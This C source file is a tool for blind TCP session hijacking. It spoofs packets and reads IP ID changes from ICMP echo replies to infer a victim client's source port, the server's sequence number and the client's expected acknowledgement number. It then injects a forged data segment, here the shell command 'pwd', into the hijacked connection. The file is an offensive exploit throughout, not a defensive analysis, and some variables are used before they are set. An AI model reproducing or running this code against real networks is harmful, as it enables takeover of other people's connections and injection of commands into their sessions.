//#include <unistd.h>
//#include <sys/time.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include "xlayer.h"
#include "datalink.h"


int
echo_get_id(struct datalink *dl,
                struct MAC *srcmac,
                struct MAC *dstmac,
		uint32_t real_ip,
                uint32_t src,
                uint32_t *dly,
                uint16_t *ip_id
		);
void
usage(const char *pgm)
{
 fprintf(stderr,"usage: %s <interface> <real ip> <gateway ip> <spoof ip> <server ip> <start port> <end port> <server port> [seq]\n",pgm);
 exit(0);
}

int
main(int argc, char **argv)
{

	struct layer *proto;
	struct MAC localmac,gwmac,cli_mac;
	uint32_t real_ip,spoof_ip,gw_ip,client_ip,server_ip,dly,
		dly_serv;
	struct TCPSocket ts;
	struct datalink icmp_dl,dl;
	uint16_t start_port,end_port,server_port,
		ip_id_a,ip_id_b,ip_id_d;
	unsigned long i,k;
	unsigned short guess_port,min_delta=-1;
	unsigned long guess_serv_seq,serv_seq=0;
	uint32_t start_guess,end_guess;
	int done;

	unsigned long ack_m, ack_h,ack_l;
	unsigned long syn_m, syn_h,syn_l;
	int guess_inc;
	int busy_sum,busy_n,busy_factor;
	int n,avg_delta;
	unsigned long total_delta,j;
	char server_send_buf[512];
	char icmp_filter[256];
	if( argc < 9 )
		usage(*argv);
	if( argc >=  10){
		errno = 0;
		serv_seq = strtoul(argv[9],NULL,10);
		if(errno)
			serv_seq =0;
	}

	srand(time(NULL));
	memset(&dl,0,sizeof(dl));
	if( if_openbyname(&dl,argv[1]) < 0 ){
		fprintf(stderr,"open_link_byname failed\n");
		return 1;
	}

	memset(&icmp_dl,0,sizeof(dl));
	if( if_openbyname(&icmp_dl,argv[1]) < 0 ){
		fprintf(stderr,"open_link_byname failed\n");
		return 1;
	}
	guess_port = start_port;
	str_to_ip(argv[2],&real_ip);	
	str_to_ip(argv[3],&gw_ip);	
	str_to_ip(argv[4],&spoof_ip);	
	str_to_ip(argv[5],&server_ip);	
	memcpy(&localmac.mac,dl.dl_mac,6);

	snprintf(icmp_filter,sizeof(icmp_filter),"icmp and icmp[0] = 0 and "
		"((src %s and dst %s) or (src %s and dst %s))",
		argv[4],argv[2],argv[5],argv[2]);
	filterDatalink(&icmp_dl,icmp_filter);
	if( dl.dl_pcap->linktype == DLT_EN10MB ){
		if( ARPRequest(&dl,&localmac,&gwmac,real_ip,server_ip,5) < 0 ){
			fprintf(stderr,"lan gateway did not reply arp\n");
		exit(1);
		}



		if( ARPRequest(&dl,&localmac,&cli_mac,real_ip,spoof_ip,5) < 0 ){
			fprintf(stderr,"lan gateway did not reply arp\n");
		exit(1);
		}

	}
	start_port = atoi(argv[6]);
	end_port = atoi(argv[7]);
	server_port = atoi(argv[8]);
	createSocket(&ts,&localmac,&gwmac,spoof_ip,
		server_ip,start_port,server_port);
	ts.rcvwin = 0;
	
	ip_id_a = ip_id_b = ip_id_d = 0;
	echo_get_id(&icmp_dl,&localmac,&gwmac,real_ip,server_ip,
		&dly,&ip_id_a);
	printf("delay to server= %lu\n",dly_serv);		
	// we should try to find busy factor here
	
	echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,		&dly,&ip_id_b);
	usleep((dly+dly_serv)*2);	
	echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,		&dly,&ip_id_a);
	
	busy_factor = ip_id_a - ip_id_b;
	
	printf("delay = %lu busy_factor =%d\n",dly,busy_factor);		
	for( i = start_port; i<= end_port; i++ ){

		SYN(&ts,&dl);
		
		usleep((dly+dly_serv));
        echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,
                &dly,&ip_id_b);

		ip_id_d = ip_id_b - ip_id_a;
		ip_id_a = ip_id_b;
		if(ip_id_d < min_delta){
			min_delta = ip_id_d;
			guess_port = i;
		}

		printf("for port %d ip_id delta = %x\n",ts.port,ip_id_d);			
		if(ip_id_d == 0 ){
			printf( " the client port is: %d\n",ts.port);	exit(0);
		}

		ts.port++;
		ts.seq++;
	}
	printf("guessed port is %d\n",guess_port);
	ts.ip = server_ip;
	ts.port = server_port;
	ts.hostip = spoof_ip;
	ts.hostport = guess_port;

	printf("finding serv.seq using 16k window\n");
	min_delta = -1;

	ip_id_a = ip_id_b = ip_id_d = 0;
if(serv_seq != 0 )
{
	ts.seq = serv_seq+65536;
	ts.gatewaymac = cli_mac;

	echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,
		
		&dly,&ip_id_a);


	ts.ack = 0;
	//ACK(&ts,&dl);
 	ts.ack = 2<<30;
		
	ACK(&ts,&dl);
	ACK(&ts,&dl);
	ACK(&ts,&dl);
	ACK(&ts,&dl);
        echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,
                &dly,&ip_id_b);

	ip_id_d = ip_id_b - ip_id_a;

	printf("for seq %lu delta = %d\n",serv_seq+65536,ip_id_d);



	ts.seq = serv_seq;

	echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,
		
		&dly,&ip_id_a);


	ts.ack = 0;
	//ACK(&ts,&dl);
 	ts.ack = 2<<30;
		
	ACK(&ts,&dl);
	ACK(&ts,&dl);
	ACK(&ts,&dl);
	ACK(&ts,&dl);
    echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,
                &dly,&ip_id_b);

	ip_id_d = ip_id_b - ip_id_a;

	printf("for seq %lu delta = %d\n",serv_seq,ip_id_d);
	closeDatalink(&dl);
	closeDatalink(&icmp_dl);
	exit(0);
}
	ip_id_a = ip_id_b = ip_id_d = 0;

	ts.gatewaymac = cli_mac;


	echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,

		&dly,&ip_id_a);
	start_guess = 0xffffffff;
	end_guess = 0;
	guess_inc = -16384;
	avg_delta = total_delta = 0;
	done = 0;
for(k = 31,j=1; k >= 14 && !done;k--){


	for( i = (2<<(31-k))+1; i > 1  && !done; i-=2,j++){


		for(n =0; n< 10;n++){
			ts.ack = 0;
			//ts.seq = (unsigned long long)((2<<(k-2))+(2<<(k-1))*i) ;
			ts.seq = (2<<k-1)*i;
			ACK(&ts,&dl);
	 		ts.ack = 2<<30;
			ACK(&ts,&dl);
		}


        echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,
                &dly,&ip_id_b);
		
		ip_id_d = ip_id_b - ip_id_a;
		ip_id_a = ip_id_b;
		
		total_delta += ip_id_d;
		avg_delta = total_delta / j;

		if(ip_id_d+10 <= avg_delta){
			guess_serv_seq = i;
			printf("idelta = %d avg_delta=%d\n",ip_id_d,avg_delta);
			done = 1;	
		}


		printf("%lu:%lu:for seq %lu ip_id delta = %x busy =%d avg_delta=%d\n",k,i,ts.seq,ip_id_d,busy_factor,avg_delta);
	}
}
	printf("guessed sequence = %lu\n",guess_serv_seq);

	ts.seq = guess_serv_seq;

	ip_id_a = ip_id_b = ip_id_d = 0;


	echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,
		&dly,&ip_id_a);

	done =0;
	syn_h = guess_serv_seq;
	
	syn_l = syn_h - 65536;
		
	syn_m = (((unsigned long long)( syn_h)) + (unsigned long long)syn_l) /2;
	printf("initial ** syn_l = %lu syn_m = %lu syn_h = %lu\n",syn_l,syn_m,syn_h);
	while(!done){
		j++;
		for(n =0; n< 10;n++){
			ts.ack = 0;
			ts.seq = syn_m;
			ACK(&ts,&dl);
	 		ts.ack = 2<<30;
			ACK(&ts,&dl);
		}


        echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,
                &dly,&ip_id_b);
		
		ip_id_d = ip_id_b - ip_id_a;
		ip_id_a = ip_id_b;
		
		total_delta += ip_id_d;
		avg_delta = total_delta / j;

		printf("for seq %lu ip_id delta = %x busy =%d avg_delta=%d\n",ts.seq,ip_id_d,busy_factor,avg_delta);
		if(ip_id_d+6 <= avg_delta){


			syn_h = syn_m;


			syn_m = (((unsigned long long)( syn_h)) + (unsigned long long)syn_l) /2;
		}else{
			syn_l = syn_m;

			syn_m = (((unsigned long long)( syn_h)) + (unsigned long long)syn_l) /2;
		}

		if(syn_l >= syn_h || syn_l == syn_m){

			done = 1;
		}

		printf("syn_l = %lu syn_m = %lu syn_h = %lu\n",syn_l,syn_m,syn_h);
	}
	ts.seq = syn_h;
    
	echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,
                &dly,&ip_id_a);

	ack_h = 0xffffffff;
	ack_l = 0;
	busy_factor = 2;
 	done =0;
	j=0;	

	ack_m = (((unsigned long long)( ack_h)) + ack_l) /2;
	while( !done ){
		j++;
		ts.ack = ack_m;
		ACK(&ts,&dl);

	 	ACK(&ts,&dl);	
	 	ACK(&ts,&dl);	

	 	ACK(&ts,&dl);	
	 	ACK(&ts,&dl);	
		echo_get_id(&icmp_dl,&localmac,&cli_mac,real_ip,spoof_ip,
                &dly,&ip_id_b);
		ts.ack = ack_m;
		ip_id_d = ip_id_b - ip_id_a;
		ip_id_a = ip_id_b;
		
		if( ip_id_d <= busy_factor ){

				ack_l = ack_m;


				ack_m = (((unsigned long long)( ack_h)) + ack_l) /2;

		}else{

				ack_h = ack_m;
				

				ack_m = (((unsigned long long)( ack_h)) + ack_l) /2;
		}

		if( ack_l >= ack_h || ack_l == ack_m)
				done = 1;

		printf("ack_l = %lu ack_m = %lu ack_h = %lu delta = %lu\n",
			ack_l,ack_m,ack_h,ip_id_d);

	}

	if(  ack_l >= ack_h ){
		printf("Found client RCV.NXT to be %lu in %d tries\n",ack_l,j);
		
	}else{
		printf("Could not find client RCV.NEXT\n");
	}

	ts.ack = ts.seq;
	ts.seq = ack_l;
	ts.rcvwin = 16384;
	ts.gatewaymac = gwmac;
	ts.hostip = server_ip;
	ts.ip = spoof_ip;
	ts.hostport = ts.port;
	ts.port = guess_port;
	//RST(&ts,&dl);	
strcpy(server_send_buf,"pwd\r\n");

PSHACK(&ts,&dl,server_send_buf,strlen(server_send_buf));

	
	closeDatalink(&dl);
	closeDatalink(&icmp_dl);
	return 0;
}
		
	
int
echo_get_id(struct datalink *dl,
		struct MAC *srcmac,
		struct MAC *dstmac,
		uint32_t real_ip,
		uint32_t src,
		uint32_t *dly,
		uint16_t *ip_id
		)
{

	struct timeval tva,tvb;
	struct layer *proto;
	int n;
	if(gettimeofday(&tva,NULL) < 0 ){
		fprintf(stderr,"gettimeofday returned error %s\n"			,strerror(errno));
		return -1;
	}


        ICMPEchoRequest(dl,srcmac,dstmac,real_ip,src,rand()%0xFFFF
, rand()%0xffff);


	proto = recvlayers(dl,&n);
	if( proto == NULL ){
		fprintf(stderr,"recvlayers returned error %s\n"
			,strerror(errno));
		return -1;
	}
	if(gettimeofday(&tvb,NULL) < 0 ){
		fprintf(stderr,"gettimeofday returned error %s\n"			,strerror(errno));
		return -1;
	}


	*dly = tvb.tv_usec - tva.tv_usec;

	proto = findlayer(proto,LT_IP);
	
 	fprintf(stderr,"ip_id=%x\n",ntohs(((xip)proto->proto)->ip_id));	
	if( proto == NULL ){
		fprintf(stderr,"findlayer returned error %s\n"
			,strerror(errno));
		return -1;
	}
	*ip_id = ntohs( ((xip)proto->proto)->ip_id);

	return 0;
}
